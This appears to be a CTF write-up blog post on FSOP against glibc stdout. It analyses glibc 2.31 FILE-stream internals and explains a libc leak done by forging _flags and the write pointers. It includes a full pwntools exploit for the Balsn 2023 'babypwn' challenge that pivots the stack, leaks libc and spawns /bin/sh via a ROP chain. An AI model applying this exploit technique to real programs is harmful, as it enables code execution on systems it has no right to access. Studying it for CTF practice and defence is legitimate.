---
title: "FSOP stdout"
date: 2023-10-13
draft: false
tags: ["fsop", "pwn"]
showTableOfContents: true
---
{{< alert >}}
**Images not loading?** Try accessing this site using a VPN.
{{< /alert >}}

## Analysis

### 1. fclose

![](https://hackmd.io/_uploads/ry9OZ6LWp.png)

`fclose()` → `__IO_new_fclose`

```c
#define fclose(fp) _IO_new_fclose (fp)
```

- src (glibc-2.31)
    
    ```c
    int
    _IO_new_fclose (FILE *fp)
    {
      int status;
    
      CHECK_FILE(fp, EOF);
    
    #if SHLIB_COMPAT (libc, GLIBC_2_0, GLIBC_2_1)
      /* We desperately try to help programs which are using streams in a
         strange way and mix old and new functions.  Detect old streams
         here.  */
      if (_IO_vtable_offset (fp) != 0)
        return _IO_old_fclose (fp);
    #endif
    
      /* First unlink the stream.  */
      if (fp->_flags & _IO_IS_FILEBUF)
        _IO_un_link ((struct _IO_FILE_plus *) fp);
    
      _IO_acquire_lock (fp);
      if (fp->_flags & _IO_IS_FILEBUF)
        status = _IO_file_close_it (fp);
      else
        status = fp->_flags & _IO_ERR_SEEN ? -1 : 0;
      _IO_release_lock (fp);
      _IO_FINISH (fp);
      if (fp->_mode > 0)
        {
          /* This stream has a wide orientation.  This means we have to free
    	 the conversion functions.  */
          struct _IO_codecvt *cc = fp->_codecvt;
    
          __libc_lock_lock (__gconv_lock);
          __gconv_release_step (cc->__cd_in.step);
          __gconv_release_step (cc->__cd_out.step);
          __libc_lock_unlock (__gconv_lock);
        }
      else
        {
          if (_IO_have_backup (fp))
    	_IO_free_backup_area (fp);
        }
      _IO_deallocate_file (fp);
      return status;
    }
    ```
    

Control Flow:

1. check `fp` through `CHECK_FILE(fp, EOF);`
2. if detect old streams (vtable available or not) then call  `_IO_old_fclose` 
3. if _flag  = 0x2000 (_IO_IS_FILEBUF) → call `_IO_un_link`
4. if _flag  = 0x2000 (_IO_IS_FILEBUF) → call `_IO_file_close_it
5. call `_IO_FINISH`

### 2. __IO_un_link

- scr (glibc-2.31)
    
    ```c
    void
    _IO_un_link (struct _IO_FILE_plus *fp)
    {
      if (fp->file._flags & _IO_LINKED)
        {
          FILE **f;
    #ifdef _IO_MTSAFE_IO
          _IO_cleanup_region_start_noarg (flush_cleanup);
          _IO_lock_lock (list_all_lock);
          run_fp = (FILE *) fp;
          _IO_flockfile ((FILE *) fp);
    #endif
          if (_IO_list_all == NULL)
    	;
          else if (fp == _IO_list_all)
    	_IO_list_all = (struct _IO_FILE_plus *) _IO_list_all->file._chain;
          else
    	for (f = &_IO_list_all->file._chain; *f; f = &(*f)->_chain)
    	  if (*f == (FILE *) fp)
    	    {
    	      *f = fp->file._chain;
    	      break;
    	    }
          fp->file._flags &= ~_IO_LINKED;
    #ifdef _IO_MTSAFE_IO
          _IO_funlockfile ((FILE *) fp);
          run_fp = NULL;
          _IO_lock_unlock (list_all_lock);
          _IO_cleanup_region_end (0);
    #endif
        }
    }
    ```
    

Control Flow:

1. if `_flags = 0x0080` then doing the below stuff
2. check if `fp == _IO_list_all` → `_IO_list_all` point to the next fp in _chain
3. loop from the _chain list starting from `_IO_list_all` , if found fp then remove it 
4. mark the _flag to indicate it closed `fp->file._flags &= ~_IO_LINKED`

### 3. ****_IO_file_close_it****

`_IO_file_close_it` →`_IO_new_file_close_it`

- src (glibc-2.31)
    
    ```c
    int
    _IO_new_file_close_it (FILE *fp)
    {
      int write_status;
      if (!_IO_file_is_open (fp))
        return EOF;
    
      if ((fp->_flags & _IO_NO_WRITES) == 0
          && (fp->_flags & _IO_CURRENTLY_PUTTING) != 0)
        write_status = _IO_do_flush (fp);
      else
        write_status = 0;
    
      _IO_unsave_markers (fp);
    
      int close_status = ((fp->_flags2 & _IO_FLAGS2_NOCLOSE) == 0
    		      ? _IO_SYSCLOSE (fp) : 0);
    
      /* Free buffer. */
      if (fp->_mode > 0)
        {
          if (_IO_have_wbackup (fp))
    	_IO_free_wbackup_area (fp);
          _IO_wsetb (fp, NULL, NULL, 0);
          _IO_wsetg (fp, NULL, NULL, NULL);
          _IO_wsetp (fp, NULL, NULL);
        }
      _IO_setb (fp, NULL, NULL, 0);
      _IO_setg (fp, NULL, NULL, NULL);
      _IO_setp (fp, NULL, NULL);
    
      _IO_un_link ((struct _IO_FILE_plus *) fp);
      fp->_flags = _IO_MAGIC|CLOSED_FILEBUF_FLAGS;
      fp->_fileno = -1;
      fp->_offset = _IO_pos_BAD;
    
      return close_status ? close_status : write_status;
    }
    ```
    

Control Flow :

1. check if file is open 
2. check if the file is open in write mode
    - `_IO_NO_WRITES`  (0x0008)
    - `_IO_CURRENTLY_PUTTING`
    - if satisfied → call `_IO_do_flush` to flush the buffer and initialize the pointers
3. check _flags2 == `_IO_FLAGS2_NOCLOSE]`(32) → `_IO_SYSCLOSE` (`__close` in vtable)

### 4. puts

`puts` → `_IO_puts` 

- src
    
    ```c
    int
    _IO_puts (const char *str)
    {
      int result = EOF;
      size_t len = strlen (str);
      _IO_acquire_lock (stdout);
    
      if ((_IO_vtable_offset (stdout) != 0
           || _IO_fwide (stdout, -1) == -1)
          && _IO_sputn (stdout, str, len) == len
          && _IO_putc_unlocked ('\n', stdout) != EOF)
        result = MIN (INT_MAX, len + 1);
    
      _IO_release_lock (stdout);
      return result;
    }
    ```
    

Note that in the scr code, it will call  `_IO_sputn` which mean that `__xsputn` from vtable of stdout will be call 

```c
(_IO_FILE_plus)_IO_2_1_stdout→vtable.__xsputn(stdout, str, len)
```

**`_IO_new_file_xsputn`**

- src
    
    ```c
    size_t
    _IO_new_file_xsputn (FILE *f, const void *data, size_t n)
    {
      const char *s = (const char *) data;
      size_t to_do = n;
      int must_flush = 0;
      size_t count = 0;
    
      if (n <= 0)
        return 0;
      /* This is an optimized implementation.
         If the amount to be written straddles a block boundary
         (or the filebuf is unbuffered), use sys_write directly. */
    
      /* First figure out how much space is available in the buffer. */
      if ((f->_flags & _IO_LINE_BUF) && (f->_flags & _IO_CURRENTLY_PUTTING))
        {
          count = f->_IO_buf_end - f->_IO_write_ptr;
          if (count >= n)
    	{
    	  const char *p;
    	  for (p = s + n; p > s; )
    	    {
    	      if (*--p == '\n')
    		{
    		  count = p - s + 1;
    		  must_flush = 1;
    		  break;
    		}
    	    }
    	}
        }
      else if (f->_IO_write_end > f->_IO_write_ptr)
        count = f->_IO_write_end - f->_IO_write_ptr; /* Space available. */
    
      /* Then fill the buffer. */
      if (count > 0)
        {
          if (count > to_do)
    	count = to_do;
          f->_IO_write_ptr = __mempcpy (f->_IO_write_ptr, s, count);
          s += count;
          to_do -= count;
        }
      if (to_do + must_flush > 0)
        {
          size_t block_size, do_write;
          /* Next flush the (full) buffer. */
          if (_IO_OVERFLOW (f, EOF) == EOF)
    	/* If nothing else has to be written we must not signal the
    	   caller that everything has been written.  */
    	return to_do == 0 ? EOF : n - to_do;
    
          /* Try to maintain alignment: write a whole number of blocks.  */
          block_size = f->_IO_buf_end - f->_IO_buf_base;
          do_write = to_do - (block_size >= 128 ? to_do % block_size : 0);
    
          if (do_write)
    	{
    	  count = new_do_write (f, s, do_write);
    	  to_do -= count;
    	  if (count < do_write)
    	    return n - to_do;
    	}
    
          /* Now write out the remainder.  Normally, this will fit in the
    	 buffer, but it's somewhat messier for line-buffered files,
    	 so we let _IO_default_xsputn handle the general case. */
          if (to_do)
    	to_do -= _IO_default_xsputn (f, s+do_write, to_do);
        }
      return n - to_do;
    }
    ```
    

Control Flow :

1. check available space in the buffer 
2. fill the buffer : `f->_IO_write_ptr` = `__mempcpy (f->_IO_write_ptr)`
3. if to-do remain `_IO_OVERFLOW` is called
4. finally call `_IO_default_xsputn` to write 

→ we focus on`_IO_OVERFLOW`

  `_IO_new_file_overflow`

- scr
    
    ```c
    int
    _IO_new_file_overflow (FILE *f, int ch)
    {
      if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
        {
          f->_flags |= _IO_ERR_SEEN;
          __set_errno (EBADF);
          return EOF;
        }
      /* If currently reading or no buffer allocated. */
      if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
        {
          /* Allocate a buffer if needed. */
          if (f->_IO_write_base == NULL)
    	{
    	  _IO_doallocbuf (f);
    	  _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
    	}
          /* Otherwise must be currently reading.
    	 If _IO_read_ptr (and hence also _IO_read_end) is at the buffer end,
    	 logically slide the buffer forwards one block (by setting the
    	 read pointers to all point at the beginning of the block).  This
    	 makes room for subsequent output.
    	 Otherwise, set the read pointers to _IO_read_end (leaving that
    	 alone, so it can continue to correspond to the external position). */
          if (__glibc_unlikely (_IO_in_backup (f)))
    	{
    	  size_t nbackup = f->_IO_read_end - f->_IO_read_ptr;
    	  _IO_free_backup_area (f);
    	  f->_IO_read_base -= MIN (nbackup,
    				   f->_IO_read_base - f->_IO_buf_base);
    	  f->_IO_read_ptr = f->_IO_read_base;
    	}
    
          if (f->_IO_read_ptr == f->_IO_buf_end)
    	f->_IO_read_end = f->_IO_read_ptr = f->_IO_buf_base;
          f->_IO_write_ptr = f->_IO_read_ptr;
          f->_IO_write_base = f->_IO_write_ptr;
          f->_IO_write_end = f->_IO_buf_end;
          f->_IO_read_base = f->_IO_read_ptr = f->_IO_read_end;
    
          f->_flags |= _IO_CURRENTLY_PUTTING;
          if (f->_mode <= 0 && f->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    	f->_IO_write_end = f->_IO_write_ptr;
        }
      if (ch == EOF)
        return _IO_do_write (f, f->_IO_write_base,
    			 f->_IO_write_ptr - f->_IO_write_base);
      if (f->_IO_write_ptr == f->_IO_buf_end ) /* Buffer is really full */
        if (_IO_do_flush (f) == EOF)
          return EOF;
      *f->_IO_write_ptr++ = ch;
      if ((f->_flags & _IO_UNBUFFERED)
          || ((f->_flags & _IO_LINE_BUF) && ch == '\n'))
        if (_IO_do_write (f, f->_IO_write_base,
    		      f->_IO_write_ptr - f->_IO_write_base) == EOF)
          return EOF;
      return (unsigned char) ch;
    }
    ```
    

Control Flow:

1. check the file is writable : `if (f->_flags & _IO_NO_WRITES`
2. checking stuff
3. finally, if `ch = EOF` call `_IO_do_write`
    
    → note `_IO_do_write`
    

`_IO_do_write` 

- src
    
    ```c
    int
    _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
    {
      return (to_do == 0
              || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
    }
    ```
    

`new_do_write`

- scr
    
    ```c
    static size_t
    new_do_write (FILE *fp, const char *data, size_t to_do)
    {
      size_t count;
      if (fp->_flags & _IO_IS_APPENDING)
        /* On a system without a proper O_APPEND implementation,
           you would need to sys_seek(0, SEEK_END) here, but is
           not needed nor desirable for Unix- or Posix-like systems.
           Instead, just indicate that offset (before and after) is
           unpredictable. */
        fp->_offset = _IO_pos_BAD;
      else if (fp->_IO_read_end != fp->_IO_write_base)
        {
          off64_t new_pos
    	= _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
          if (new_pos == _IO_pos_BAD)
    	return 0;
          fp->_offset = new_pos;
        }
      count = _IO_SYSWRITE (fp, data, to_do);
      if (fp->_cur_column && count)
        fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
      _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
      fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
      fp->_IO_write_end = (fp->_mode <= 0
    		       && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
    		       ? fp->_IO_buf_base : fp->_IO_buf_end);
      return count;
    }
    ```
    

It will call `_IO_SYSWRITE` in our exploit, it is a leak.

## Techniques

### 1.  hijack vtable

overwrite vtable and put appropriate address that we want to call in the vtable struct

### 2. leak libc

<aside>
💡 Fake _flags and _IO_write_base then a function using stdout (puts,printf) call after , we will get the libc address

</aside>

![](https://hackmd.io/_uploads/BJ-1VTIW6.png)

**Analysis :**

- __flags have 4 bytes
    - first 2 byte is `_IO_MAGIC` (`0xFBAD0000`)
    - the rest is flags
    - all flags
        
        ```c
        /* Magic number and bits for the _flags field.  The magic number is
           mostly vestigial, but preserved for compatibility.  It occupies the
           high 16 bits of _flags; the low 16 bits are actual flag bits.  */
        #define _IO_MAGIC         0xFBAD0000 /* Magic number */
        #define _IO_MAGIC_MASK    0xFFFF0000
        #define _IO_USER_BUF          0x0001 /* Don't deallocate buffer on close. */
        #define _IO_UNBUFFERED        0x0002
        #define _IO_NO_READS          0x0004 /* Reading not allowed.  */
        #define _IO_NO_WRITES         0x0008 /* Writing not allowed.  */
        #define _IO_EOF_SEEN          0x0010
        #define _IO_ERR_SEEN          0x0020
        #define _IO_DELETE_DONT_CLOSE 0x0040 /* Don't call close(_fileno) on close.  */
        #define _IO_LINKED            0x0080 /* In the list of all open files.  */
        #define _IO_IN_BACKUP         0x0100
        #define _IO_LINE_BUF          0x0200
        #define _IO_TIED_PUT_GET      0x0400 /* Put and get pointer move in unison.  */
        #define _IO_CURRENTLY_PUTTING 0x0800
        #define _IO_IS_APPENDING      0x1000
        #define _IO_IS_FILEBUF        0x2000
                                   /* 0x4000  No longer used, reserved for compat.  */
        #define _IO_USER_LOCK         0x8000
        ```
        
    
    → we need to note `_IO_CURRENTLY_PUTTING` (0x800) and `_IO_IS_APPENDING` (0x1000)
    
- From the vtable, we need to note:
    - __overflow
    - __xsputn
    - __write
- `puts` → `__IO_puts` → `_IO_new_file_xsputn` **→** `_IO_new_file_overflow` → `_IO_do_write`
- `_IO_do_write` → `_IO_new_do_write` → `new_do_write`
- finally it will call `_IO_SYSWRITE(f, f→_IO_write_base, f→_IO_write_ptr - f→_IO_write_base)`
    
    → output `stdout→_IO_write_base` with length of `f→_IO_write_ptr - f→_IO_write_base` to stdout
    

**To-do :** 

- need to bypass 2 if statements in `_IO_new_file_overflow`:
    1. first : 
        
        ```c
         if (f->_flags & _IO_NO_WRITES)
        ```
        
        → _flags ≠ `_IO_NO_WRITES` (0x0008)
        
    2. second :
        
        ```c
          if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
        ```
        
        → flags = `_IO_CURRENTLY_PUTTING` (0x800) or  `_IO_write_base` ≠ NULL
        
- bypass another if statements in `new_do_write` :
    
    ```c
    if (fp->_flags & _IO_IS_APPENDING)
    ```
    
    → _flag = `_IO_IS_APPENDING` (0x1000)
    
## How to leak libc
1. overwrite `_flag` to `0xfbad1800`
2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to the ptr that have an address we want to leak
3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr + x` (it will leak x byte). That ptr must in read and writable address.
4. call puts -> leak.

## DEMO balsn babypwn 2023

We are given a simple binary 

![](https://hackmd.io/_uploads/B1qTwTLWT.png)

![](https://hackmd.io/_uploads/Byi0waU-T.png)

But we dont have pop rdi gadget

![](https://hackmd.io/_uploads/rJV-_6Uba.png)

We cannot do ret2dlresolve due to Full Relro. ret2csu is also impossible to do. So we will do some special techniques. After that ctf end, people mostly solved it in three ways :
- bruteforce libc by using one_gadget (LMAO)
- use add eax gadget to point eax to the area that have libc address then call puts to leak libc.
- use fsop

I will use fsop in this exploit.

We will do that in three part : 
- Stack pivot to bss 
- Overwrite the stdout ptr in the bss by using FSOP
- Leak libc -> ret2syscall 

### Stack pivot to bss:

This is just a very simple process. Note that i use a very high address (bss + 0x400)

```python  
payload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)
sl(payload)

payload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)
sl(payload)
```    
### FSOP

This is the hard part. The big question in this step is how to overwrite the stdout ptr. My idea is use the `leave, ret` gadget. 

EX : rsp = a , rbp = b (b is point to c). Now when we call `leave, ret` it will become rsp = b+8, rbp = c.

Using the above example, we can utilize it to make the rbp point to that stdout ptr. But here is one big problem : the stdout ptr is store in `0x404010` which is the beginning of the bss. So when we call `gets` it will get sigsegv because libc will push something to our bss() and at some point it will go to some uninitialized address.  

So how to bypass it ?. This make me stuck for a very long time. After all, i realised when call `puts` (with our rsp is now point to bss) the bss will have stdout address !. By using stack cached we can bypass the above problem (using another address not 0x404010). 

![](https://hackmd.io/_uploads/SJ3ApaLZp.png)


Another problem is when we do the `leave, ret` to overwrite the new stdout ptr `addr1` , our rsp ptr will now point to `addr1 + 8` and will look for address to return. So before overwrite that new ptr, we must overwrite `addr1 + 8` to point to some useful ropchain in our program.

More problem appear !!!. After we overwrite that ptr, and puts leak the libc. The leave, ret instruction will execute again ! and will make our rsp point to some location in the libc (writable of course) so we must also overwrite it to new ropchain. In order to do that and not overwrite the vtable, we must partial overwrite lower address of `addr1` to `\x00` 


Now we can fsop by : 
1. overwrite `_flag` to `0xfbad1800`
2. overwrite `_IO_read_ptr`, ` _IO_read_end`, `_IO_read_base`, `_IO_write_base` to got table (any function you like)
3. overwrite `_IO_write_ptr`, `_IO_write_end`, `_IO_buf_base`, `_IO_buf_end` to `ptr` (that `ptr` must be the bss to make it writable )
4. call puts -> leak.
### ret2syscall

This is the final step, and with the libc we can easily get shell

```python!
poprdi = libc.address + 0x000000000002a3e5
poprsi = libc.address + 0x000000000002be51
poprdx = libc.address + 0x00000000000796a2
poprax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4
payload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)
sl(payload)
```

### Recap
1. Stack pivot to bss 
2. Read again in the bss , puts to make the bss have the new stdout `ptr1`
3. overwrite the lower address of that `ptr1` to `\x00`
4. overwrite `ptr1+8` to ropchain
5. return to the above ropchain, now we can fsop stdout
6. fsop stdout and ropchain in here
7. return to bss and do ret2syscall
8. get shell


Script : 
```python!
import sys
from pwn import *
context.binary = exe = ELF("chall_patched")
libc = ELF("libc.so.6")
if (args.REMOTE):
        p = remote()
else :
        p = process(exe.path)

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if (args.GDB):
        gdb.attach(p,
        """
        b*0x00000000004011bb
        b*0x00000000004011c6
        c
        """)
        input()

poprbp = 0x000000000040115d
leave = 0x00000000004011c5
addrsp = 0x0000000000401016
ret = 0x000000000040101a

fake_file = p64(0xfbad1800)+p64(0x403fe8)*4+p64(exe.bss()+0x50)*4

payload = b'a'*32+p64(exe.bss()+0x400 + 0x20)+p64(exe.sym['main']+42)
sl(payload)

payload = b'a'*32+p64(0x404200+0x20)+p64(exe.sym['main']+42)
sl(payload)

payload = b'a'*32+p64(0x404340+8+0x20)+p64(exe.sym['main']+42)
sl(payload)

payload = b'a'*32+p64(0x404378+8+0x20)+p64(exe.sym['main']+42)
sl(payload)

payload = p64(0x4011a0)*4 + p64(0x404378) + p64(leave)
sl(payload)

payload = b'\x00'*32 + p64(exe.bss()+0x100) + p64(exe.sym['main']+42)+b'\x00'*112+ fake_file
sl(payload)
for i in range(0,5):
        p.recvline()
leak = u64(p.recvn(8))
libc.address = leak - libc.sym['setvbuf']
print("leak : ",hex(leak))
print("base : ",hex(libc.address))

poprdi = libc.address + 0x000000000002a3e5
poprsi = libc.address + 0x000000000002be51
poprdx = libc.address + 0x00000000000796a2
poprax = libc.address + 0x0000000000045eb0
syscall = libc.address + 0x0000000000029db4

payload = b'a'*32+b'b'*8+p64(poprdi)+p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(poprsi)+p64(0)+p64(poprdx)+p64(0)+p64(poprax)+p64(0x3b)+p64(syscall)
sl(payload)
p.interactive()
```
![](https://hackmd.io/_uploads/rkKwGRIZa.png)


## Credit 
1. https://ctftime.org/writeup/34812
2. https://rninche01.tistory.com/entry/stdout-flag%EB%A5%BC-%EC%9D%B4%EC%9A%A9%ED%95%9C-libc-leak?category=838537


